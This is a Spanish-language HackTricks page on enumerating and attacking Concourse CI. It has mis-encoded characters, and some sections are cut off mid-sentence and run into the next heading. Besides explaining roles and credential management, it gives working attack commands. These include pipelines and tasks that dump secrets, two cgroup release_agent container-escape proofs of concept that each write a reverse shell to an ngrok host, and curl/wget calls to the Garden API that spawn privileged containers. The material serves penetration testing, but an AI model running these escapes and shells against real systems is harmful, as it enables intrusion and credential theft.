# Enumeraci칩n y ataques a Concourse

<details>

<summary><strong>춰Apoya a HackTricks y obt칠n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **칰ltima versi칩n de PEASS o descargar HackTricks en PDF** 춰Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Roles y permisos de usuario

Concourse viene con cinco roles:

* _Concourse_ **Admin**: Este rol solo se otorga a los propietarios del **equipo principal** (equipo inicial predeterminado de Concourse). Los administradores pueden **configurar otros equipos** (por ejemplo: `fly set-team`, `fly destroy-team`...). Los permisos de este rol no pueden ser afectados por RBAC.
* **owner**: Los propietarios del equipo pueden **modificar todo dentro del equipo**.
* **member**: Los miembros del equipo pueden **leer y escribir** dentro de los **activos del equipo** pero no pueden modificar la configuraci칩n del equipo.
* **pipeline-operator**: Los operadores de pipeline pueden realizar **operaciones de pipeline** como desencadenar compilaciones y fijar recursos, sin embargo, no pueden actualizar las configuraciones de pipeline.
* **viewer**: Los espectadores del equipo tienen acceso de **"solo lectura" a un equipo** y sus pipelines.

{% hint style="info" %}
Adem치s, los **permisos de los roles owner, member, pipeline-operator y viewer pueden ser modificados** configurando RBAC (configurando m치s espec칤ficamente sus acciones). Lee m치s sobre esto en: [https://concourse-ci.org/user-roles.html](https://concourse-ci.org/user-roles.html)
{% endhint %}

Ten en cuenta que Concourse **agrupa pipelines dentro de equipos**. Por lo tanto, los usuarios que pertenecen a un equipo podr치n administrar esos pipelines y **pueden existir varios equipos**. Un usuario puede pertenecer a varios equipos y tener diferentes permisos dentro de cada uno de ellos.

## Vars y gestor de credenciales

En las configuraciones YAML puedes configurar valores utilizando la sintaxis `((`_`nombre-fuente`_`:`_`ruta-secreta`_`.`_`campo-secreto`_`))`.\
El **nombre de la fuente es opcional**, y si se omite, se utilizar치 el [gestor de credenciales de todo el cl칰ster](https://concourse-ci.org/vars.html#cluster-wide-credential-manager), o el valor se puede proporcionar [est치ticamente](https://concourse-ci.org/vars.html#static-vars).\
El campo secreto **opcional** _**secret-field**_ especifica un campo en el secreto recuperado para leer. Si se omite, el gestor de credenciales puede optar por leer un 'campo predeterminado' del credencial recuperado si el campo existe.\
Adem치s, la _**ruta-secreta**_ y el _**campo-secreto**_ pueden estar rodeados por comillas dobles `"..."` si **contienen caracteres especiales** como `.` y `:`. Por ejemplo, `((source:"my.secret"."field:1"))` establecer치 la _ruta-secreta_ en `my.secret` y el _campo-secreto_ en `field:1`.

### Vars est치ticas

Las vars est치ticas se pueden especificar en **pasos de tareas**:

```yaml
  - task: unit-1.13
    file: booklit/ci/unit.yml
    vars: {tag: 1.13}
```

O utilizando los siguientes **argumentos** de `fly`:

* `-v` o `--var` `NOMBRE=VALOR` establece la cadena `VALOR` como el valor para la var `NOMBRE`.
* `-y` o `--yaml-var` `NOMBRE=VALOR` analiza `VALOR` como YAML y lo establece como el valor para la var `NOMBRE`.
* `-i` o `--instance-var` `NOMBRE=VALOR` analiza `VALOR` como YAML y lo establece como el valor para la var de instancia `NOMBRE`. Consulta [Agrupaci칩n de pipelines](https://concourse-ci.org/instanced-pipelines.html) para obtener m치s informaci칩n sobre las vars de instancia.
* `-l` o `--load-vars-from` `ARCHIVO` carga `ARCHIVO`, un documento YAML que contiene nombres de vars y valores de asignaci칩n, y los establece todos.

### Gesti칩n de credenciales

Hay diferentes formas de **especificar un gestor de credenciales** en un pipeline, lee c칩mo en [https://concourse-ci.org/creds.html](https://concourse-ci.org/creds.html).\
Adem치s, Concourse admite diferentes gestores de credenciales:

* [El gestor de credenciales Vault](https://concourse-ci.org/vault-credential-manager.html)
* [El gestor de credenciales CredHub](https://concourse-ci.org/credhub-credential-manager.html)
* [El gestor de credenciales AWS SSM](https://concourse-ci.org/aws-ssm-credential-manager.html)
* [El gestor de credenciales AWS Secrets Manager](https://concourse-ci.org/aws-asm-credential-manager.html)
* [Gestor de credenciales de Kubernetes](https://concourse-ci.org/kubernetes-credential-manager.html)
* [El gestor de credenciales Conjur](https://concourse-ci.org/conjur-credential-manager.html)
* [Cach칠 de credenciales](https://concourse-ci.org/creds-caching.html)
* [Redacci칩n de credenciales](https://concourse-ci.org/creds-redacting.html)
* [Reintentos de recuperaciones fallidas](https://concourse-ci.org/creds-retry-logic.html)

{% hint style="danger" %}
Ten en cuenta que si tienes alg칰n tipo de **acceso de escritura a Concourse** puedes crear trabajos para **filtrar esos secretos** ya que Concourse necesita poder acceder a ellos.
{% endhint %}

## Enumeraci칩n de Concourse

Para enumerar un entorno de Concourse primero necesitas **recopilar credenciales v치lidas** o encontrar un **token autenticado** probablemente en un archivo de configuraci칩n `.flyrc`.

### Enumeraci칩n de inicio de sesi칩n y usuario actual

* Para iniciar sesi칩n necesitas conocer el **punto final**, el **nombre del equipo** (predeterminado es `main`) y un **equipo al que pertenece el usuario**:
  * `fly --target example login --team-name my-team --concourse-url https://ci.example.com [--insecure] [--client-cert=./path --client-key=./path]`
* Obtener **objetivos** configurados:
  * `fly targets`
* Obtener si la conexi칩n de **objetivo configurado** sigue siendo **v치lida**:
  * `fly -t <target> status`
* Obtener el **rol** del usuario contra el objetivo indicado:
  * `fly -t <target> userinfo`

{% hint style="info" %}
Ten en cuenta que el **token de API** se **guarda** en `$HOME/.flyrc` de forma predeterminada, si saqueas una m치quina podr칤as encontrar all칤 las credenciales.
{% endhint %}

### Equipos y usuarios

* Obtener una lista de los equipos
  * `fly -t <target> teams`
* Obtener roles dentro del equipo
  * `fly -t <target> get-team -n
### Sesi칩n dentro de un contenedor en ejecuci칩n o recientemente ejecutado

Si tiene suficientes privilegios (**rol de miembro o superior**), podr치 **listar pipelines y roles** y simplemente obtener una **sesi칩n dentro** del contenedor `<pipeline>/<job>` usando:

```bash
fly -t tutorial intercept --job pipeline-name/job-name
fly -t tutorial intercept # Para que se le presente un indicador con todas las opciones
```

Con estos permisos, podr칤a ser capaz de:

* **Robar los secretos** dentro del **contenedor**
* Intentar **escapar** al nodo
* Enumerar/Abusar del punto final de **metadatos de la nube** (desde el pod y desde el nodo, si es posible)

### Creaci칩n/Modificaci칩n de Pipeline

Si tiene suficientes privilegios (**rol de miembro o superior**), podr치 **crear/modificar nuevos pipelines**. Compruebe este ejemplo:

```yaml
jobs:
- name: simple
  plan:
  - task: simple-task
    privileged: true
    config:
      # Tells Concourse which type of worker this task should run on
      platform: linux
      image_resource:
        type: registry-image
        source:
          repository: busybox # images are pulled from docker hub by default
      run:
        path: sh
        args:
        - -cx
        - |
          echo "$SUPER_SECRET"
          sleep 1000
      params:
        SUPER_SECRET: ((super.secret))
```

Con la **modificaci칩n/creaci칩n** de un nuevo pipeline, podr치:

* **Robar** los **secretos** (mediante la impresi칩n de los mismos o entrando en el contenedor y ejecutando `env`)
* **Escapar** al **nodo** (d치ndole suficientes privilegios - `privileged: true`)
* Enumerar/Abusar del punto final de **metadatos de la nube** (desde el pod y desde el nodo)
* **Eliminar** el pipeline creado

### Ejecutar tarea personalizada

Esto es similar al m칠todo anterior, pero en lugar de modificar/crear un nuevo pipeline, puede **ejecutar una tarea personalizada** (lo que probablemente ser치 mucho m치s **sigiloso**):

```yaml
# Para obtener m치s opciones de task_config, consulte https://concourse-ci.org/tasks.html
platform: linux
image_resource:
  type: registry-image
  source:
    repository: ubuntu
run:
  path: sh
  args:
  - -cx
  - |
    env
    sleep 1000
params:
  SUPER_SECRET: ((super.secret))
```

```bash
fly -t tutorial execute --privileged --config task_config.yml
```

### Escapar al nodo desde una tarea privilegiada

En las secciones anteriores vimos c칩mo **ejecutar una tarea privilegiada con Concourse**. Esto no dar치 al contenedor exactamente el mismo acceso que la bandera privilegiada en un contenedor de Docker. Por ejemplo, no ver치 el dispositivo de sistema de archivos del nodo en /dev, por lo que la fuga podr칤a ser m치s "compleja".

En el siguiente PoC vamos a utilizar el release\_agent para escapar con algunas peque침as modificaciones:

```bash
# Monta el controlador de grupo RDMA cgroup y crea un cgroup secundario
# Si est치 siguiendo y obtiene "mount: /tmp/cgrp: dispositivo especial cgroup no existe"
# Es porque su configuraci칩n no tiene el controlador de grupo de memoria, intente cambiar la memoria a rdma para solucionarlo
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Habilita las notificaciones de cgroup en la liberaci칩n del cgroup "x"
echo 1 > /tmp/cgrp/x/notify_on_release


# CAMBIA ESTO
# La ruta del host se ver치 as칤, pero necesitas cambiarla:
host_path="/mnt/vda1/hostpath-provisioner/default/concourse-work-dir-concourse-release-worker-0/overlays/ae7df0ca-0b38-4c45-73e2-a9388dcb2028/rootfs"

## La ruta inicial "/mnt/vda1" probablemente sea la misma, pero puede comprobarlo usando el comando mount:
#/dev/vda1 on /scratch type ext4 (rw,relatime)
#/dev/vda1 on /tmp/build/e55deab7 type ext4 (rw,relatime)
#/dev/vda1 on /etc/hosts type ext4 (rw,relatime)
#/dev/vda1 on /etc/resolv.conf type ext4 (rw,relatime)

## Luego la siguiente parte creo que es constante "hostpath-provisioner/default/"

## Para la siguiente parte "concourse-work-dir-concourse-release-worker-0" necesitas saber c칩mo se construye
# "concourse-work-dir" es constante
# "concourse-release" es el prefijo de Concourse del entorno actual de Concourse (necesitas encontrarlo desde la API)
# "worker-0" es el nombre del trabajador en el que se est치 ejecutando el contenedor (normalmente ser치 ese o incrementando el n칰mero)

## La parte final "overlays/bbedb419-c4b2-40c9-67db-41977298d4b3/rootfs" es algo constante
# ejecutando `mount | grep "on / " | grep -Eo "workdir=([^,]+)"` ver치 algo como:
# workdir=/concourse-work-dir/overlays/work/ae7df0ca-0b38-4c45-73e2-a9388dcb2028
# la UID es la parte que estamos buscando

# Entonces la ruta host es:
#host_path="/mnt/<device>/hostpath-provisioner/default/concourse-work-dir-<concourse_prefix>-worker-<num>/overlays/<UID>/rootfs"

# Establece release_agent en /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent


#====================================
#Shell inversa
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Obtener salida
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Ejecuta el ataque generando un proceso que finaliza inmediatamente dentro del cgroup secundario "x"
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Lee la salida
cat /output
```

{% hint style="warning" %}
Como puede haber notado, esto es solo una [**fuga regular de release\_agent**](broken-reference) modificando la ruta del cmd en el nodo
{% endhint %}

### Escapar al nodo desde un contenedor de trabajador

Una fuga regular de release\_agent con una modificaci칩n menor es suficiente para esto:

```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Habilita las notificaciones de cgroup en la liberaci칩n del cgroup "x"
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -n 1`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#====================================
#Shell inversa
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Obtener salida
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Ejecuta el ataque generando un proceso que finaliza inmediatamente dentro del cgroup secundario "x"
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Lee la salida
cat /output
```

### Escapar al nodo desde el contenedor web

Incluso si el contenedor web tiene algunas defensas desactivadas, **no se est치 ejecutando como un contenedor privilegiado com칰n** (por ejemplo, **no puede** **montar** y las **capacidades** son muy **limitadas**, por lo
### Abuso del servicio Garden - No es un ataque real

{% hint style="warning" %}
Estas son solo algunas notas interesantes sobre el servicio, pero como solo est치 escuchando en localhost, estas notas no presentar치n ning칰n impacto que no hayamos explotado antes.
{% endhint %}

Por defecto, cada trabajador de Concourse ejecutar치 un servicio [**Garden**](https://github.com/cloudfoundry/garden) en el puerto 7777. Este servicio es utilizado por el maestro web para indicar al trabajador **lo que necesita ejecutar** (descargar la imagen y ejecutar cada tarea). Esto suena bastante bien para un atacante, pero hay algunas protecciones interesantes:

* Solo est치 **expuesto localmente** (127..0.0.1) y creo que cuando el trabajador se autentica de nuevo en la Web con el servicio SSH especial, se crea un t칰nel para que el servidor web pueda **hablar con cada servicio Garden** dentro de cada trabajador.
* El servidor web est치 **monitoreando los contenedores en ejecuci칩n cada pocos segundos**, y los contenedores **inesperados** son **eliminados**. As칤 que si quieres **ejecutar un contenedor personalizado**, necesitas **manipular** la **comunicaci칩n** entre el servidor web y el servicio garden.

Los trabajadores de Concourse se ejecutan con altos privilegios de contenedor:

```
Tiempo de ejecuci칩n del contenedor: docker
Tiene espacios de nombres:
	pid: verdadero
	usuario: falso
Perfil AppArmor: kernel
Capacidades:
	BOUNDING -> chown dac_override dac_read_search fowner fsetid kill setgid setuid setpcap linux_immutable net_bind_service net_broadcast net_admin net_raw ipc_lock ipc_owner sys_module sys_rawio sys_chroot sys_ptrace sys_pacct sys_admin sys_boot sys_nice sys_resource sys_time sys_tty_config mknod lease audit_write audit_control setfcap mac_override mac_admin syslog wake_alarm block_suspend audit_read
Seccomp: desactivado
```

Sin embargo, t칠cnicas como **montar** el dispositivo /dev del nodo o release\_agent **no funcionar치n** (ya que el dispositivo real con el sistema de archivos del nodo no es accesible, solo uno virtual). No podemos acceder a los procesos del nodo, por lo que escapar del nodo sin exploits del kernel se vuelve complicado.

{% hint style="info" %}
En la secci칩n anterior vimos c칩mo escapar de un contenedor privilegiado, as칤 que si podemos **ejecutar** comandos en un contenedor **privilegiado** creado por el **trabajador actual**, podr칤amos **escapar al nodo**.
{% endhint %}

Tenga en cuenta que jugando con Concourse not칠 que cuando se genera un nuevo contenedor para ejecutar algo, los procesos del contenedor son accesibles desde el contenedor del trabajador, por lo que es como si un contenedor creara un nuevo contenedor dentro de 칠l.

#### Entrando en un contenedor privilegiado en ejecuci칩n

```bash
# Obtener el contenedor actual
curl 127.0.0.1:7777/containers
{"Handles":["ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

# Obtener informaci칩n del contenedor
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/properties

# Ejecutar un nuevo proceso dentro de un contenedor
## En este caso, "sleep 20000" se ejecutar치 en el contenedor con el controlador ac793559-7f53-4efc-6591-0171a0391e53
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
  --header='Content-Type:application/json' \
  'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'
  
# O en lugar de hacer todo eso, simplemente puede ingresar al ns del proceso del contenedor privilegiado
nsenter --target 76011 --mount --uts --ipc --net --pid -- sh
```

#### Creando un nuevo contenedor privilegiado

Puede crear f치cilmente un nuevo contenedor (simplemente ejecutando un UID aleatorio) y ejecutar algo en 칠l:

```bash
curl -X POST http://127.0.0.1:7777/containers \
   -H 'Content-Type: application/json' \
   -d '{"handle":"123ae8fc-47ed-4eab-6b2e-123458880690","rootfs":"raw:///concourse-work-dir/volumes/live/ec172ffd-31b8-419c-4ab6-89504de17196/volume","image":{},"bind_mounts":[{"src_path":"/concourse-work-dir/volumes/live/9f367605-c9f0-405b-7756-9c113eba11f1/volume","dst_path":"/scratch","mode":1}],"properties":{"user":""},"env":["BUILD_ID=28","BUILD_NAME=24","BUILD_TEAM_ID=1","BUILD_TEAM_NAME=main","ATC_EXTERNAL_URL=http://127.0.0.1:8080"],"limits":{"bandwidth_limits":{},"cpu_limits":{},"disk_limits":{},"memory_limits":{},"pid_limits":{}}}'

# Wget se quedar치 all칤 mientras se est칠 ejecutando el proceso
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
  --header='Content-Type:application/json' \
  'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'
```

Sin embargo, el servidor web est치 revisando cada pocos segundos los contenedores que se est치n ejecutando, y si se descubre uno inesperado, se eliminar치. Como la comunicaci칩n se est치 produciendo en HTTP, podr칤a manipular la comunicaci칩n para evitar la eliminaci칩n de contenedores inesperados:

```
GET /containers HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
.

T 127.0.0.1:7777 -> 127.0.0.1:59722 [AP] #157
HTTP/1.1 200 OK.
Content-Type: application/json.
Date: Thu, 17 Mar 2022 22:42:55 GMT.
Content-Length: 131.
.
{"Handles":["123ae8fc-47ed-4eab-6b2e-123458880690","ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

T 127.0.0.1:59722 -> 127.0.0.1:7777 [AP] #159
DELETE /containers/123ae8fc-47ed-4eab-6b2e-123458880690 HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
```

<details>

<summary><strong>춰Apoya a HackTricks y obt칠n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **칰ltima versi칩n de PEASS o descargar HackTricks en PDF** 춰Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t